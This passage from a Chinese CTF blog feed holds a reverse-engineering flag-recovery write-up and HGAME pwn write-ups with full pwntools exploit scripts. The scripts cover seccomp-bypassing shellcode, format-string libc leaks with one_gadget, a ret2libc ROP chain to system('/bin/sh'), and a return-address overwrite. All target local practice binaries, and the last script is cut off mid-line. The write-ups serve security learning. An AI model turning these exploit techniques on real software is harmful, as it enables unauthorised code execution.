id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cal</span><span class="params">(<span class="keyword">double</span> a1,<span class="keyword">double</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> temp = <span class="built_in">pow</span>(a1, a2 - <span class="number">1.0</span>);</span><br><span class="line">    <span class="keyword">double</span> result = temp / <span class="built_in">exp</span>(a1);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v94 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(v94=<span class="number">90000</span>;v94&lt;<span class="number">100000000</span>;v94++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> v15 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v18 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v94 / <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v16 = v16 + cal(v17, v18) * <span class="number">0.001</span>;</span><br><span class="line">            v17 = v17 + <span class="number">0.001</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v17 &lt;= <span class="number">100.0</span> );</span><br><span class="line">        <span class="keyword">double</span> v19 = (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>);</span><br><span class="line">        <span class="keyword">double</span> v20 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v21 = (<span class="keyword">double</span>)(v94 % <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v15 = v15 + cal(v20, v21) * <span class="number">0.001</span>;</span><br><span class="line">            v20 = v20 + <span class="number">0.001</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v20 &lt;= <span class="number">100.0</span> );</span><br><span class="line">        <span class="keyword">if</span>(v19 == <span class="number">0x13b03</span> &amp;&amp; (<span class="keyword">int</span>)(v15 + v15 + <span class="number">3.0</span>) == <span class="number">0x5a2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,v94);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//99038</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a7 = [<span class="number">0x08</span>, <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x06</span>, <span class="number">0x73</span>, <span class="number">0x02</span>, <span class="number">0x40</span>]</span><br><span class="line">number = <span class="string">&quot;99038198076198076198076198076198076&quot;</span></span><br><span class="line"><span class="comment">#输入数字乘2接到后面</span></span><br><span class="line">k = [<span class="number">0xe0</span>,<span class="number">0x95</span>,<span class="number">0xba</span>,<span class="number">0x60</span>,<span class="number">0xc9</span>,<span class="number">0x66</span>,<span class="number">0x2a</span>,<span class="number">0x24</span>,<span class="number">0xb2</span>,<span class="number">0x36</span>]</span><br><span class="line">a10 = [<span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x8E</span>, <span class="number">0x3F</span>, <span class="number">0xAA</span>, <span class="number">0x14</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0xC6</span>, <span class="number">0x06</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    c = <span class="built_in">chr</span>(a7[i] ^ <span class="built_in">ord</span>(number[i]))</span><br><span class="line">    flag.append(c)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="comment">#1ti5K3y</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    d = <span class="built_in">chr</span>(k[i] ^ a10[i])</span><br><span class="line">    flag.append(d)</span><br><span class="line"></span><br><span class="line">flag_last = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag_last)</span><br><span class="line"><span class="comment">#1ti5K3yRC4_crypt0</span></span><br><span class="line"><span class="comment">#后面那个原来是RC4吗</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;2021虎符CTF  Re&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="re" scheme="https://www.0wl.site/tags/re/"/>
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>HGAME  Pwn 题学习</title>
    <link href="https://www.0wl.site/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.0wl.site/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-31T07:10:05.000Z</published>
    <updated>2021-11-16T14:54:34.833Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Hgame Pwn题</p></div></article><span id="more"></span><h2 id="1-letter"><a href="#1-letter" class="headerlink" title="1.letter"></a>1.letter</h2><h3 id="所需知识："><a href="#所需知识：" class="headerlink" title="所需知识："></a>所需知识：</h3><blockquote><p>​    计算机中有符号数用补码来表示（用原码或反码表示都会出现重复的0），正数的补码是数本身，负数的补码是原码按位取反加 1 ，负数补码取反加 1 是其绝对值</p></blockquote><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>​    题目中没有 <code>system() </code>来 <code>getshell</code>，参考官方 writeup 知道没开 NX保护就可以在堆栈上写入 <code>shellcode</code> 并执行</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter.png" class=""><p>​    输入有个长度判断，根据有符号数和无符号数可以 -1 绕过</p><p>​    因为要在栈上执行代码所以需要 <code>jmp rsp</code> ，用 <code>ROPgadget</code> 查一下</p><blockquote><p>ROPgadget –binary ./letter | grep “jmp rsp”</p></blockquote><p>​    没发现有 jmp rsp ，看了一下 writeup 尝试用输入的负数构造 jmp rsp，用 ida 查看机器码为 FF E4（FF E4就是内存中的顺序），int 为四字节所以构造 F0 00 E4 FF 的负数 -268376833 （最高位是 1 ，然后转为无符号数稍微大点的大概都行吧。。。，但是我用 FF 00 E4 FF 的时候偶尔会出错） </p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter2.png" class=""><p>​    这里可以看到程序利用沙箱只允许使用部分系统调用，第二个参数是白名单的意思，可以根据系统调用号查得只允许使用 open ，read ，write，或者用 seccomp-tools 直接看开了什么。那么接下来就用这几个系统调用来打开并读取 flag 文件内容</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter3.png" class=""><p>​    下面是 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序是 amd64 的</span></span><br><span class="line">shellcode = shellcraft.amd64.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    本地复现结果</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter4.png" class=""><h2 id="2-once"><a href="#2-once" class="headerlink" title="2.once"></a>2.once</h2><h3 id="所需知识：-1"><a href="#所需知识：-1" class="headerlink" title="所需知识："></a>所需知识：</h3><blockquote><p>32位程序中的 printf 函数逆序传参，参数都存放在栈上<br>64位程序中的 printf 函数也是逆序传参，前 6 个参数（从右到左）存放在寄存器中，依次为 RDI、RSI、RDX、 RCX、 R8以及R9 ，其他多的参数存在栈上</p></blockquote><h3 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h3><p>​    先用 checksec 查一下，开启了 PIE 保护</p><p>​    ida 反编译发现</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once.png" class=""><p>​    没有直接的 <code>system</code> 或 <code>execve</code> 来 <code>getshell</code>，但 vuln 函数里有格式化字符串漏洞 printf ，题目中也给了 libc版本，可以 leak 出 libc 基址再加上 one_gadget 来 <code>getshell</code></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once2.png" class=""><p>​    Constraints 意思是限制条件，不满足条件的没法用</p><p>​    下面是 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./once&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line"></span><br><span class="line">pay1 = pay1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#补齐到 0x28</span></span><br><span class="line"></span><br><span class="line">pay1 += <span class="string">&#x27;\xD3&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&#x27;turn: &#x27;</span>,pay1)</span><br><span class="line"></span><br><span class="line">addr = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">addr = addr.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(addr,<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#int函数有第二个参数那第一个参数要是字符，第二个参数表示输入的进制数</span></span><br><span class="line"></span><br><span class="line">libcbase = addr - <span class="number">231</span> -libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(libcbase + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;turn: &#x27;</span>,pay2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><p>​    开启了 pie 随机化，但因为内存分页制度（好像是这个）地址的最低12位是不变的，所以可以覆盖返回地址最低位的一个字节来回到 vuln 函数开头</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once3.png" class=""><p>​    <del>关于为什么是 D3 而不是 D2 我还没弄明白，此处待填</del>（<a href="https://hack543.com/16-bytes-stack-alignment-movaps-issue/%EF%BC%89">https://hack543.com/16-bytes-stack-alignment-movaps-issue/）</a></p><p>​    还有 <code>libc_start_main</code> 地址泄露的 %13$p（输出第13个参数）</p><h2 id="3-rop-primary"><a href="#3-rop-primary" class="headerlink" title="3.rop_primary"></a>3.rop_primary</h2><h3 id="所需知识：-2"><a href="#所需知识：-2" class="headerlink" title="所需知识："></a>所需知识：</h3><p>​    <strong>rop 学习：</strong><a href="https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc</a></p><p>​    <strong>延迟绑定机制：</strong></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary4.jpg" class=""><blockquote><p>​    函数等到用到时才进行绑定，第一次调用时 got 表里保存的是 plt表 <code>push XX</code> 的地址，然后 <code>_ dl_runtime_resolve ()</code> 函数会去 libc 库里找到函数真正的地址写到 got 表里</p></blockquote><p>​    </p><p>​    <strong>x86 与 x64 ROP区别（vidar 培训的图）：</strong></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary5.png" class=""><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary6.png" class=""><h3 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h3><p>​    <img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary3.png" class=""></p><p>​    开了 NX 保护，那就是 rop 绕过，ida f5 可以看到有通过命令行参数（argv[1]）打开的文件，之后在文件里读取三个矩阵，本地调试的话可以构造一个这样的文件。check 函数检测矩阵 a，b 进行乘法运算的结果与 c 矩阵比较</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary.png" class=""><p>​    vuln 函数可以溢出，没有 <code>system</code> 和 <code>/bin/sh</code>，那就需要通过 read 函数泄露 libc 版本获得</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary2.png" class=""><p>​    下面是 exp（因为自己写的 exp 不小心删掉了，所以前面矩阵运算借鉴了官方 writeup 的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_martix</span>():</span> </span><br><span class="line">    matrix = [] </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        line = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip() </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line: </span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        row = [] </span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">            row.append(<span class="built_in">int</span>(num)) </span><br><span class="line">        matrix.append(row)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> matrix </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi</span>(<span class="params">a, b</span>):</span> </span><br><span class="line">    rows = <span class="built_in">len</span>(a) </span><br><span class="line">    mid = <span class="built_in">len</span>(b) </span><br><span class="line">    cols = <span class="built_in">len</span>(b[<span class="number">0</span>]) </span><br><span class="line">    martixC = [] </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows): </span><br><span class="line">        row = [] </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols): </span><br><span class="line">            num = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid): </span><br><span class="line">                num += a[i][k] * b[k][j] </span><br><span class="line">            row.append(num) </span><br><span class="line">        martixC.append(row) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> martixC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop_primary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = elf.process(argv = [<span class="string">&#x27;martix&#x27;</span>])<span class="comment">#添加命令行参数</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">martixA = read_martix()</span><br><span class="line"></span><br><span class="line">martixB = read_martix()</span><br><span class="line"></span><br><span class="line">martixC = multi(martixA,martixB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> martixC: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> row: </span><br><span class="line"></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x401613</span> <span class="comment">#用 ROPgadget 获取 poprdi ; ret 地址</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span> </span><br><span class="line"></span><br><span class="line">again = <span class="number">0x40157C</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(poprdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pay += p64(again)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;best\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak并计算基址</span></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,leak_addr)</span><br><span class="line"></span><br><span class="line">libcbase = leak_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) </span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">pay2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(poprdi) +p64(binsh) + p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;best\n&#x27;</span>,pay2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="4-killer-queen"><a href="#4-killer-queen" class="headerlink" title="4.killer queen"></a>4.killer queen</h2><p>格式化字符串，改 retn 地址，注意 <code>memset</code> 操作会覆盖 <code>format</code>，所以需要 <code>choice1</code> 写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./killerqueen&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;]</span></span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;break choice2&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0],&quot;break choice2&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;X、去接将要打来的电话\n&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">weather = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(weather)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc 地址</span></span><br><span class="line">payload = <span class="string">b&quot;%19$p-%38$p&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;X、去接将要打来的电话\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4294967294</span>-weather))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;那么，电话号码是——\n&quot;</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;「Killer Queen」杀死了岸边露伴...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">stdout = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">retn_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stdout_addr: &quot;</span>+<span class="built_in">hex</span>(stdout))</span><br><span class="line">log.success(<span class="string">&quot;retn_addr: &quot;</span>+<span class="built_in">hex</span>(retn_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>,stdout)</span><br><span class="line">libc_base = stdout - libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">onegadget = <span class="number">0x4f3d5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+onegadget))</span><br><span class="line"></span><br><span class="line">target = libc_base+onegadget</span><br><span class="line">retn_addr += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖返回地址</span></span><br><span class="line"><span class="keyword">if</span> target&amp;<span class="number">0xffff</span> &gt; ((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>):</span><br><span class="line">    payload = (<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%10$hn&quot;</span>+<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff</span>)-((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>))+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%11$hn&quot;</span>).ljust(<span class="number">32</span>,<span 